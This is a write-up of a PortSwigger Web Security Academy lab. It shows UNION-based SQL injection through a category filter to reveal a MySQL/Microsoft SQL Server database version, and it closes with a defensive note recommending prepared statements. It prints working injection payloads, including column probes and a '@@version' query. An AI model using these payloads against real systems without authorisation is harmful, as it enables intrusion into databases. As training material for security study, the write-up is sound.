# PortSwigger SQL Injection — MySQL/Microsoft Database Version via UNION

- Platform: PortSwigger Web Security Academy
- Category: SQL injection / Examining the database
- Difficulty: Practitioner
- Goal: query the database version on MySQL/Microsoft-style syntax
- Result: solved

## Summary

The category filter is vulnerable to UNION-based SQL injection:

```text
/filter?category=Gifts
```

The lab expects a version query using `@@version`, which works for MySQL and Microsoft SQL Server style version disclosure.

## UNION testing

The working comment style was:

```text
-- -
```

A two-column UNION worked:

```text
Gifts' UNION SELECT NULL,NULL-- -
```

A string visibility test also worked:

```text
Gifts' UNION SELECT 'abc','def'-- -
```

## Payload

The successful version query placed `@@version` in the visible second column:

```text
Gifts' UNION SELECT NULL,@@version-- -
```

The page displayed the database version and the lab solved.

## Notes

- Oracle needs `FROM dual`; this lab does not.
- MySQL comments usually require whitespace after `--`, so `-- -` is a reliable terminator in URL payloads.
- If one UNION column does not visibly render, move the version expression to the other column.

## Defensive takeaway

The fix is prepared statements. Error suppression and metadata permission reduction are useful, but they do not address the underlying injection.